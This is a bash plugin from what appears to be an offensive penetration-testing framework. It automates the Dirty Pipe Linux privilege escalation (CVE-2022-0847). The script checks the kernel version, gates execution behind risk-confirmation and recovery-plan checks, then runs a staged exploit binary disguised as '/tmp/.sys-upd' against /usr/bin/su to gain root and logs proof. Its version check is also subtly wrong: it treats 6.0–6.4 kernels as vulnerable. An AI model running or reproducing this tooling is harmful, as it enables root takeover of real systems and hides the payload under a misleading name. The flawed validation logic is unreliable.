#!/usr/bin/env bash
# ==============================================================================
# v0502_dirtypipe.sh — Plugin for vector V-05-02 (T1068, CVE-2022-0847)
# Consumed by exploit_runner.sh (canonical runner, phase 06).
# Subcommands: validate | execute
#
# ELITE DOCTRINE IMPLEMENTED HERE:
#   - This plugin may ONLY run after phase-06 primary vector resolved
#     (runner refuses otherwise: --findings must show consolidation state).
#   - Crash-risk gate: requires --confirm-risk AND a recovery plan file with
#     three mandatory sections. Missing sections = mechanical refusal.
#   - Validation is offline and exact: kernel >= 5.8, < 5.16.11 / 5.15.25.
# ==============================================================================
set -uo pipefail
VECTOR_ID="V-05-KERN-CVE-2022-0847"
TECHNIQUE="T1068"
EVID_DIR="${EVID_DIR:-./dp_evidence}"
TS="${TS:-$(date -u +%Y%m%dT%H%M%SZ)}"
CONFIRM_RISK="${CONFIRM_RISK:-0}"
RECOVERY_PLAN="${RECOVERY_PLAN:-}"

# fixed-range check: patched minors (safe) — CVE-2022-0847 fixed in 5.16.11, 5.15.25, 5.10.102
is_patched() {
  local kv="$1" maj min patch
  IFS='.' read -r maj min patch <<< "$(echo "$kv" | grep -oE '^[0-9]+\.[0-9]+\.[0-9]+' || echo "$kv")"
  (( maj == 5 )) || return 1
  if (( min == 15 )); then (( patch >= 25 )) && return 0; fi
  if (( min == 10 )); then (( patch >= 102 )) && return 0; fi
  if (( min == 16 )); then (( patch >= 11 )) && return 0; fi
  return 1
}

require_risk_gate() {
  # crash-risk gate: mechanical, not decorative
  local errors=0
  if (( CONFIRM_RISK != 1 )); then
    echo "[!] GO/NO-GO: --confirm-risk not set. Kernel exploits need explicit operator decision." >&2
    errors=$((errors+1))
  fi
  if [[ -z "${RECOVERY_PLAN}" || ! -s "${RECOVERY_PLAN}" ]]; then
    echo "[!] GO/NO-GO: recovery plan missing (--recovery-plan FILE)." >&2
    errors=$((errors+1))
  else
    local section
    for section in "session.recovery" "crash.handling" "evidence.preservation"; do
      if ! grep -qiE "${section}" "${RECOVERY_PLAN}"; then
        echo "[!] GO/NO-GO: recovery plan missing mandatory section: ${section}" >&2
        errors=$((errors+1))
      fi
    done
  fi
  (( errors == 0 )) || exit 3
  echo "### go/no-go: ACCEPTED ts=$(date -u +%FT%TZ) plan=${RECOVERY_PLAN}" >> "${EVID_DIR}/gonogo.log" 2>/dev/null || true
}

cmd="${1:-help}"
case "${cmd}" in
  validate)
    mkdir -p "${EVID_DIR}"
    KVER="$(uname -r)"
    echo "kernel=${KVER}" > "${EVID_DIR}/validation.txt"
    # range check: >= 5.8 and not patched
    if ! echo "${KVER}" | grep -qE '^5\.(8|9|1[0-6])\.|^6\.[0-4]\.'; then
      echo "range=no_match" >> "${EVID_DIR}/validation.txt"; exit 3
    fi
    if is_patched "${KVER}"; then
      echo "patched=yes (safe minor)" >> "${EVID_DIR}/validation.txt"; exit 3
    fi
    echo "range=match patched=no" >> "${EVID_DIR}/validation.txt"
    exit 0
    ;;

  execute)
    mkdir -p "${EVID_DIR}"
    require_risk_gate
    {
      echo "### proof-of-execution ts=${TS} vector=${VECTOR_ID} (crash-risk class)"
      echo "kernel=$(uname -r)"
    } > "${EVID_DIR}/execution_proof.txt"

    # Exploit binary is operator-staged (portability doctrine, same as AIE plugin):
    # public PoC compiled on operator host, uploaded with neutral name.
    # Plugin validates staging, executes, captures proof.
    EXPLOIT_BIN="${EXPLOIT_BIN:-/tmp/.sys-upd}"
    if [[ ! -x "${EXPLOIT_BIN}" ]]; then
      echo "exploit_binary=missing path=${EXPLOIT_BIN}" >> "${EVID_DIR}/execution_proof.txt"
      echo '{"outcome":"execution_failed","reason":"operator must stage compiled PoC (see USAGE 3.2)"}' \
        > "${EVID_DIR}/outcome.json"
      exit 4
    fi

    # Bounded execution: PoC overwrites /usr/bin/su page cache -> run root shell
    # to collect proof and exit. Single attempt (runner ceiling).
    {
      "${EXPLOIT_BIN}" /usr/bin/su 2>&1 | head -n 5
      id
      echo "euid=$(id -u)"
    } >> "${EVID_DIR}/execution_proof.txt" 2>&1

    if grep -q "^euid=0" "${EVID_DIR}/execution_proof.txt"; then
      echo '{"outcome":"context_obtained","euid":0,"class":"crash_risk_vector"}' \
        > "${EVID_DIR}/outcome.json"
      exit 0
    fi
    echo '{"outcome":"execution_failed","reason":"PoC executed without root context"}' \
      > "${EVID_DIR}/outcome.json"
    exit 4
    ;;

  *) echo "usage: $0 validate|execute (env: CONFIRM_RISK=1, RECOVERY_PLAN=FILE, EXPLOIT_BIN=path)" >&2; exit 2 ;;
esac
